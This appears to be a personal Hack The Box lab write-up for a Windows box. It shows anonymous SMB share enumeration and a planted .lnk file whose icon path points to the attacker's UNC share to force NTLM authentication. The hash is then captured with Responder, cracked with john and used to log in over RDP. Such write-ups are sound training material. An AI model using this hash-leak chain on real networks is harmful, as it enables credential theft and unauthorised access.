---
tags: [htb, windows, easy, writeup]
cve: none (Mark of the Web, no CVE)
techniques: [smb-enum, ntlm-leak, hash-cracking]
---
# LinkItUp (Windows)

| Field              | Value           |
| ------------------ | --------------- |
| OS                 | Windows         |
| Difficulty         | Easy            |
| Box IP             | `10.129.234.64` |
| Attacker IP (tun0) | `<tun0-ip>`     |

> [!info] Kill Chain
> [[SMB Enumeration]] (anon share) → malicious `.lnk` on the share → victim right-click triggers [[NTLM Hash Leak]] → hash captured via [[Responder]] → [[Hash Cracking]] (john) → creds → RDP → **flag**

> [!note] The flaw – what triggers the auth
> A `.lnk` contains an **icon path**. If it points to a UNC path (`\\<attacker-ip>\share`), Windows must load the icon over SMB from there as soon as Explorer **renders** the file (folder view / preview / right-click) – no click on the file needed.
> Establishing the SMB connection automatically triggers **NTLM authentication** → the NTLMv2 hash of the displayed user goes to the UNC host (= my Responder). Affects all Windows versions. Microsoft only blocks this for internet downloads via *Mark of the Web* → **no CVE**; files on internal **shares** carry no MotW → still vulnerable. Mechanism: [[NTLM Hash Leak]].

---

# 1 · Enumeration

## Ports → [[nmap]]
```bash
nmap -sV -sC 10.129.234.64
```
- `-sV` = service versions, `-sC` = default scripts
- SMB (445) + RDP (3389) open → attack path: entry via SMB, final access via RDP

## Shares anonymously → [[SMB Enumeration]]
```bash
smbclient -L //10.129.234.64/share -N
# => writable share found
```
- `-N` = without password (null session), checks for anonymous access → often possible on misconfigured shares
- the share must be **writable** (not just readable) → otherwise no own file can be placed

---

# 2 · Credential Access → [[NTLM Hash Leak]]

## 2.1 Building the malicious `.lnk`
`poc.c` adjusted so the `.lnk` points to **my own IP** (`\\<tun0-ip>\share`).
```bash
x86_64-w64-mingw32-gcc -o poc poc.c   # compile on Linux => poc.exe
wine poc.exe                          # run the .exe => poc.lnk
```
> `mingw32-gcc` compiles Windows binaries on Linux, `wine` runs them.
- the decisive part is the **icon path** of the `.lnk` → if it points to `\\<tun0-ip>\share`, Windows loads the icon over SMB from my machine as soon as Explorer renders the file → the NTLM hash is transmitted in the process
- the **own tun0 IP** goes in `poc.c`, not the box's (otherwise the hash is sent to the wrong address)

## 2.2 Placing the `.lnk` on the share
```bash
smbclient //10.129.234.64/share -N -c 'put poc.lnk'
```
- `put` uploads the file to the share → the simulated user opens that folder
- merely **rendering** the file in Explorer triggers the icon rendering (no click/open of the `.lnk` needed) → SMB connection to me → hash is transmitted

## 2.3 Capturing the hash → [[Responder]]
```bash
responder -I tun0 -P
# waits for SMB auth; once the user views the folder => NTLMv2 hash appears
```
- Responder emulates the SMB server, accepts the authentication and logs the hash
- `-I tun0` = listens on the VPN interface → the hash appears in the console once the folder is viewed

## 2.4 Cracking the hash → [[Hash Cracking]]
```bash
john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
# => plaintext password
```
- NTLMv2 is not suitable for pass-the-hash → it must be cracked offline to obtain the plaintext password
- `john` hashes every word from `rockyou.txt` and compares it with the target hash → match = password

---

# 3 · Access → Flag

```bash
xfreerdp3 /v:10.129.234.64 /u:<user> /p:<password> /cert:ignore
# => desktop, flag read
```
- login via RDP (3389) with the credentials. `/cert:ignore` accepts the self-signed certificate
- access to the desktop → flag read
